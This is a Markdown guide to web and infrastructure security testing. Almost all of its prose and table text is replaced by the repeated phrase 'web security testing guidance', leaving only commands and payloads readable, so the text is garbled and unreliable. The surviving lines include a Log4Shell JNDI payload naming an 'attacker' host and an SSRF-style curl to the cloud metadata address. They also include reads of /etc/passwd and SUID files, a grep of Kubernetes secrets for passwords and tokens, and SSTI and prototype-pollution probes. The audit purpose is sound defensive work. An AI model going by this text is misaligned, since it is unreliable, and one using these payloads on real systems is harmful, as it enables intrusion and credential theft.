# Webweb security testing guidance

> **web security testing guidance**: web security testing guidanceWooYunweb security testing guidance + web security testing guidance + OWASPweb security testing guidance
> **web security testing guidance**: WooYunweb security testing guidance + L1-L4web security testing guidance
> **web security testing guidance**: AIweb security testing guidance → [ai-baseline-security.md](ai-baseline-security.md)

---

## web security testing guidance、web security testing guidance

### 1.1 web security testing guidance

```
web security testing guidance = web security testing guidance × web security testing guidance × web security testing guidance
```

web security testing guidance 70-90% web security testing guidance，web security testing guidance（web security testing guidance Log4Shell、Polyfill.io）。

### 1.2 web security testing guidance

**npm/yarn web security testing guidance**

| web security testing guidance | web security testing guidance | web security testing guidance |
|----------|------|----------|
| web security testing guidance | web security testing guidance(typosquatting) | `crossenv` web security testing guidance |
| web security testing guidance | `lodash`/`jQuery` web security testing guidance | CVE-2019-10744 |
| web security testing guidance | web security testing guidance | `event-stream` web security testing guidance |
| CDNweb security testing guidance | web security testing guidanceCDNweb security testing guidanceJSweb security testing guidance | Polyfill.ioweb security testing guidance |
| web security testing guidance | package.json scriptsweb security testing guidance | `postinstall` web security testing guidance |

**web security testing guidance**

```bash
# web security testing guidance
npm audit
yarn audit

# web security testing guidance
npm outdated

# web security testing guidance
npm ls --all | head -100

# web security testing guidance
npm pack --dry-run  # web security testing guidance
cat node_modules/<pkg>/package.json | grep -A5 '"scripts"'
```

### 1.3 web security testing guidance

**Python/pip**

```bash
# web security testing guidance
pip-audit
safety check

# web security testing guidance
pip list --outdated
pipdeptree  # web security testing guidance
```

**Java/Maven**

```bash
# OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# web security testing guidance
mvn dependency:tree
```

**web security testing guidance**

| web security testing guidance | CVE | web security testing guidance | web security testing guidance |
|------|-----|------|------|
| Log4j2 | CVE-2021-44228 | RCE | `${jndi:ldap://attacker/}` |
| Spring4Shell | CVE-2022-22965 | RCE | Spring Framework < 5.3.18 |
| FastJSON | CVE-2022-25845 | RCE | autoTypeweb security testing guidance |
| Apache Struts2 | CVE-2017-5638 | RCE | Content-Typeweb security testing guidance |
| Jackson | CVE-2019-12384 | RCE | web security testing guidance |
| Commons-Collections | CVE-2015-6420 | RCE | Javaweb security testing guidance |
| jQuery | CVE-2020-11022 | XSS | < 3.5.0 HTMLweb security testing guidance |
| Lodash | CVE-2021-23337 | RCE | web security testing guidance |

### 1.4 Dockerweb security testing guidance

```bash
# web security testing guidance
trivy image <image:tag>
grype <image:tag>

# web security testing guidance
docker inspect <image> | grep -i "rootfs\|created\|author"

# web security testing guidance(web security testing guidance/web security testing guidance)
docker history --no-trunc <image>
```

**web security testing guidance**：
- web security testing guidance `latest` web security testing guidance
- web security testing guidance(web security testing guidancegcc/curl)
- Dockerfileweb security testing guidance/web security testing guidance
- web security testing guidancerootweb security testing guidance

### 1.5 SCAweb security testing guidance

| web security testing guidance | web security testing guidance/web security testing guidance | web security testing guidance |
|------|-----------|------|
| `npm audit` / `yarn audit` | JavaScript | web security testing guidance,web security testing guidance |
| `pip-audit` / `safety` | Python | web security testing guidance |
| OWASP Dependency-Check | Java/.NET | web security testing guidance,web security testing guidance |
| Snyk | web security testing guidance | SaaS,web security testing guidance |
| Trivy | web security testing guidance/IaC/SBOM | web security testing guidance,web security testing guidance |
| Grype | web security testing guidance | web security testing guidance,Anchoreweb security testing guidance |
| Renovate / Dependabot | web security testing guidance | GitHubweb security testing guidance |

### 1.6 SBOM(web security testing guidance)

```bash
# web security testing guidance SBOM (CycloneDXweb security testing guidance)
cyclonedx-npm --output sbom.json            # Node.js
cyclonedx-py --format json -o sbom.json      # Python
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom  # Java

# web security testing guidance SBOM (SPDXweb security testing guidance)
syft <image> -o spdx-json > sbom.spdx.json   # web security testing guidance
```

SBOM web security testing guidance：web security testing guidance、web security testing guidance、web security testing guidance、web security testing guidance。

### 1.7 web security testing guidance

- **web security testing guidance**: web security testing guidance `package-lock.json` / `Pipfile.lock` / `pom.xml` web security testing guidance
- **web security testing guidance**: web security testing guidance，web security testing guidance
- **CIweb security testing guidance**: web security testing guidanceCI/CDweb security testing guidanceSCAweb security testing guidance，web security testing guidance
- **web security testing guidance**: web security testing guidanceNexus/Verdaccioweb security testing guidance，web security testing guidance
- **web security testing guidance**: npmweb security testing guidance`npm audit signatures`web security testing guidance
- **web security testing guidance**: web security testing guidanceDependabot/Renovateweb security testing guidancePR

---

## web security testing guidance、web security testing guidance

### 2.1 web security testing guidance

```
web security testing guidance = web security testing guidance × web security testing guidance × web security testing guidance
```

web security testing guidance。web security testing guidance。

### 2.2 web security testing guidance

**web security testing guidance**

```bash
# web security testing guidance
nmap -sV -p- <target>

# web security testing guidance
# 22(SSH) 3306(MySQL) 6379(Redis) 27017(MongoDB) 9200(Elasticsearch)
# 8080(Tomcat) 8443(web security testing guidance) 2375(Docker API) 10250(Kubelet)
```

| web security testing guidance | web security testing guidance | web security testing guidance |
|--------|----------|------|
| SSH | web security testing guidancerootweb security testing guidance、web security testing guidance、web security testing guidance22web security testing guidance | web security testing guidance |
| web security testing guidance | web security testing guidance127.0.0.1/web security testing guidanceIP | web security testing guidance |
| Redis | web security testing guidance、web security testing guidance、renameweb security testing guidance | RCE(web security testing guidancewebshell/crontab/ssh) |
| MongoDB | web security testing guidance、web security testing guidance | web security testing guidance |
| Docker API | web security testing guidanceUnix Socket、web security testing guidanceTLS | web security testing guidance/RCE |
| Elasticsearch | X-Packweb security testing guidance、web security testing guidance | web security testing guidance |
| Kubernetes API | RBAC、web security testing guidance、web security testing guidance | web security testing guidance |

**web security testing guidance**

```bash
# Linuxweb security testing guidance
cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuth|Port"
cat /etc/passwd | grep ':0:'          # web security testing guidancerootweb security testing guidance
find / -perm -4000 2>/dev/null        # SUIDweb security testing guidance
crontab -l                            # web security testing guidance
last -20                              # web security testing guidance
ss -tlnp                              # web security testing guidance
iptables -L -n                        # web security testing guidance
```

### 2.3 TLS/SSL/HTTPS web security testing guidance

**web security testing guidance**

```bash
# SSL/TLSweb security testing guidance
nmap --script ssl-enum-ciphers -p 443 <target>
testssl.sh <target>
sslyze <target>

# web security testing guidance
# https://www.ssllabs.com/ssltest/
```

**web security testing guidance**

| web security testing guidance | web security testing guidance | web security testing guidance |
|------|------|------|
| TLS 1.0/1.1 web security testing guidance | BEAST/POODLEweb security testing guidance | web security testing guidanceTLS 1.2+ |
| web security testing guidance(RC4/DES/MD5) | web security testing guidance | web security testing guidanceAES-GCM/ChaCha20 |
| web security testing guidance/web security testing guidance | web security testing guidance | web security testing guidanceLet's Encrypt/CAweb security testing guidance |
| web security testing guidanceHSTSweb security testing guidance | SSL Strip | `Strict-Transport-Security: max-age=31536000` |
| web security testing guidance(HTTP+HTTPS) | web security testing guidance | web security testing guidanceHTTPS+CSP |

**Nginxweb security testing guidance**

```nginx
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # web security testing guidance
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    add_header Content-Security-Policy "default-src 'self'";
    add_header Referrer-Policy strict-origin-when-cross-origin;
    
    # web security testing guidance
    server_tokens off;
    
    # web security testing guidance
    autoindex off;
}
```

### 2.4 web security testing guidance

**web security testing guidance (AWS/Azure/GCP/web security testing guidance)**

| web security testing guidance | web security testing guidance | web security testing guidance |
|------|----------|------|
| S3/OSSweb security testing guidance | `aws s3 ls s3://bucket --no-sign-request` | web security testing guidance |
| IAMweb security testing guidance | web security testing guidance`*`web security testing guidance | web security testing guidance |
| web security testing guidance | web security testing guidance`0.0.0.0/0`web security testing guidance | web security testing guidance |
| web security testing guidance | `trufflehog`/`gitleaks` web security testing guidance | web security testing guidance |
| web security testing guidance | `curl http://169.254.169.254/` (SSRFweb security testing guidance) | web security testing guidance |
| web security testing guidance | CloudTrail/ActionTrailweb security testing guidance | web security testing guidance |

**PaaSweb security testing guidance (Railway/Vercel/Heroku/Netlify)**

| web security testing guidance | web security testing guidance | web security testing guidance |
|------|------|------|
| web security testing guidance | web security testing guidance/web security testing guidanceENV | web security testing guidance |
| web security testing guidance | CNAMEweb security testing guidancePaaSweb security testing guidance | `dig CNAME <domain>` web security testing guidance |
| web security testing guidance | web security testing guidance | web security testing guidance |
| web security testing guidance | API Tokenweb security testing guidanceCIweb security testing guidance | web security testing guidanceCI/CDweb security testing guidance |
| web security testing guidance | Serverlessweb security testing guidance | web security testing guidance |

**web security testing guidance**

```bash
# web security testing guidance
gitleaks detect --source=. --verbose
trufflehog git https://github.com/org/repo

# web security testing guidance
.env / .env.production / .env.local
docker-compose.yml
CIweb security testing guidance: .github/workflows/*.yml / .gitlab-ci.yml / Jenkinsfile
web security testing guidance: next.config.js / .env.NEXT_PUBLIC_*
```

### 2.5 web security testing guidance

> **AIweb security testing guidance**: web security testing guidanceAI Agent/LLMweb security testing guidance → [ai-baseline-security.md](ai-baseline-security.md) §web security testing guidance

**Dockerweb security testing guidance**

```bash
# web security testing guidancerootweb security testing guidance
docker inspect <container> | grep '"User"'

# web security testing guidance
docker inspect <container> | grep '"Privileged"'

# web security testing guidance(web security testing guidance)
docker inspect <container> | grep -A10 '"Mounts"'

# web security testing guidanceCapabilities
docker inspect <container> | grep -A20 '"CapAdd"'
```

**Kubernetesweb security testing guidance**

```bash
# RBACweb security testing guidance
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl get clusterrolebinding -o wide

# Podweb security testing guidance
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'

# Secretweb security testing guidance
kubectl get secrets -o yaml | grep -i "password\|token\|key"

# web security testing guidance
kubectl get networkpolicy -A
```

### 2.6 CI/CDweb security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|------|------|------|
| web security testing guidance | Pipelineweb security testing guidance | web security testing guidanceVault/Sealed Secrets |
| web security testing guidance | CIweb security testing guidance | web security testing guidanceCIweb security testing guidance |
| web security testing guidance | PRweb security testing guidanceCIweb security testing guidance | Fork PRweb security testing guidanceCI |
| web security testing guidance | web security testing guidance | Cosign/Notaryweb security testing guidance |
| web security testing guidance | CI Tokenweb security testing guidance | web security testing guidanceToken |

### 2.7 web security testing guidanceChecklist

**web security testing guidance**
- [ ] SSHweb security testing guidance,web security testing guidanceroot
- [ ] web security testing guidance(80/443)
- [ ] web security testing guidance/web security testing guidance
- [ ] web security testing guidanceOSweb security testing guidance
- [ ] web security testing guidance

**HTTPS**
- [ ] TLS 1.2+ web security testing guidance
- [ ] HSTSweb security testing guidance + CAAweb security testing guidance
- [ ] web security testing guidance(Let's Encrypt)

**web security testing guidance**
- [ ] IAMweb security testing guidance + MFA
- [ ] web security testing guidance + web security testing guidance
- [ ] web security testing guidanceIP
- [ ] CloudTrail/web security testing guidance
- [ ] web security testing guidanceKMS/Vaultweb security testing guidance,web security testing guidance

**web security testing guidance**
- [ ] web security testing guidancerootweb security testing guidance
- [ ] web security testing guidance
- [ ] web security testing guidance + web security testing guidanceCapabilities
- [ ] web security testing guidance(Trivy/Grype)
- [ ] web security testing guidancePodweb security testing guidance

**CI/CD**
- [ ] web security testing guidanceSecretweb security testing guidance,web security testing guidance
- [ ] SCAweb security testing guidance
- [ ] web security testing guidance
- [ ] Fork PRweb security testing guidance

---

## web security testing guidance、web security testing guidanceWebweb security testing guidanceCVEweb security testing guidance

> web security testing guidance Next.js、Spring Boot、Django、Rails、Express、Laravel web security testing guidanceWebweb security testing guidanceCVEweb security testing guidance

### 3.1 web security testing guidance

**web security testing guidance**

| web security testing guidance | web security testing guidance | web security testing guidance |
|----------|----------|----------|
| HTTPweb security testing guidance | web security testing guidance`X-Powered-By`、`Server`、`X-Framework` | web security testing guidance |
| Cookieweb security testing guidance | `JSESSIONID`(Java), `laravel_session`(Laravel), `_next`(Next.js) | web security testing guidance |
| web security testing guidance | web security testing guidance404/500，web security testing guidance、web security testing guidance、web security testing guidance | web security testing guidance+web security testing guidance |
| web security testing guidance | `/_next/`(Next.js), `/static/`(Django), `/assets/`(Rails) | web security testing guidance+web security testing guidance |
| JSweb security testing guidance | web security testing guidance`webpack`/`vite`/`turbopack`web security testing guidance、web security testing guidance | web security testing guidance |
| Source Map | web security testing guidance`*.js.map`web security testing guidance、web security testing guidanceimportweb security testing guidance | web security testing guidance+web security testing guidance |
| web security testing guidance/web security testing guidance | HTMLweb security testing guidance`<meta name="generator">`、web security testing guidance | web security testing guidance |
| package.jsonweb security testing guidance | web security testing guidance`/package.json`、`/composer.json`、`/Gemfile.lock` | web security testing guidance |

```
web security testing guidance:
1. web security testing guidance → web security testing guidance、Cookie、HTML、JSweb security testing guidance
2. web security testing guidance → web security testing guidance、web security testing guidance、web security testing guidance
3. web security testing guidance → web security testing guidance.web security testing guidance.web security testing guidance
4. CVEweb security testing guidance → NVD/Snyk/GitHub Advisory web security testing guidance
```

### 3.2 CVEweb security testing guidancePoCweb security testing guidance

**CVEweb security testing guidance**

| web security testing guidance | URL | web security testing guidance |
|--------|-----|------|
| NVD | nvd.nist.gov | web security testing guidanceCVEweb security testing guidance，CVSSweb security testing guidance |
| GitHub Advisory | github.com/advisories | web security testing guidance，web security testing guidancePoCweb security testing guidance |
| Snyk | snyk.io/vuln | web security testing guidance |
| Exploit-DB | exploit-db.com | web security testing guidancePoCweb security testing guidanceEXP |
| PacketStorm | packetstormsecurity.com | web security testing guidance |
| web security testing guidanceChangeLog | web security testing guidanceRelease Notes | web security testing guidance |

**web security testing guidanceCVEweb security testing guidance**

```
1. web security testing guidance
   web security testing guidance → web security testing guidanceCVEweb security testing guidance(affected versions) → web security testing guidance

2. PoCweb security testing guidance
   a. web security testing guidancePoC (GitHub/Exploit-DB/web security testing guidance)
   b. web security testing guidance(web security testing guidancediffweb security testing guidance)
   c. web security testing guidance
   d. web security testing guidance: web security testing guidance,web security testing guidancePayload

3. web security testing guidance(L4web security testing guidance)
   a. web security testing guidancediff → web security testing guidance
   b. web security testing guidance: web security testing guidance
   c. web security testing guidance: web security testing guidance web security testing guidance 
```

### 3.3 web security testing guidance

| web security testing guidance | web security testing guidance | web security testing guidance |
|-----------|-------------|-------------|
| **web security testing guidance/web security testing guidance** | web security testing guidance: `//path`、`/./path`、`/%2e/path`、web security testing guidance、web security testing guidance | web security testing guidance、web security testing guidance |
| **web security testing guidance/web security testing guidance** | web security testing guidance: `{{7*7}}`(Jinja2), `${7*7}`(Thymeleaf), `<%= 7*7 %>`(ERB) | SSTI→RCE |
| **web security testing guidance** | web security testing guidance(`ac ed 00 05`/`O:`/`rO0AB`), web security testing guidance | Java/PHP/Pythonweb security testing guidanceRCE |
| **Server Actions/RPC** | web security testing guidanceRPCweb security testing guidance,web security testing guidance,web security testing guidance | CSRF、web security testing guidance |
| **SSR/RSCweb security testing guidance** | web security testing guidance(web security testing guidance`_rsc`/`__data`/`loader`),web security testing guidancePayload | web security testing guidance |
| **web security testing guidance** | web security testing guidance: `.env`、`web.config`、`application.yml`、`settings.py` | web security testing guidance/web security testing guidance |
| **web security testing guidance** | web security testing guidance: `/debug`、`/_debug`、`/__inspect`、`/graphql`(introspection) | web security testing guidance→RCE |
| **web security testing guidance(JS)** | JSONweb security testing guidance`{"__proto__":{"isAdmin":true}}`web security testing guidance`{"constructor":{"prototype":{"x":1}}}` | web security testing guidance、DoS |
| **web security testing guidance** | web security testing guidanceKeyweb security testing guidance(`X-Forwarded-Host`/`X-Original-URL`), web security testing guidance | web security testing guidanceXSS、web security testing guidance |

### 3.4 web security testing guidanceChecklist

```
[ ] web security testing guidance
[ ] web security testing guidanceNVD/Snyk/GitHub Advisoryweb security testing guidanceCVE
[ ] web security testing guidanceCVE(CVSS≥7.0)web security testing guidance
[ ] Source Mapweb security testing guidance
[ ] web security testing guidance
[ ] web security testing guidance/web security testing guidance/web security testing guidance
[ ] web security testing guidance
[ ] web security testing guidance/web security testing guidance
[ ] APIweb security testing guidance(web security testing guidanceCookie/Tokenweb security testing guidance)
[ ] web security testing guidance(CSP/HSTS/X-Frame-Options/X-Content-Type-Options)
[ ] CSRFweb security testing guidance
[ ] web security testing guidanceRPC/Actionweb security testing guidance
```

---

*web security testing guidanceWooYunweb security testing guidance(88,636web security testing guidance)web security testing guidance + web security testing guidance/web security testing guidance | web security testing guidance*
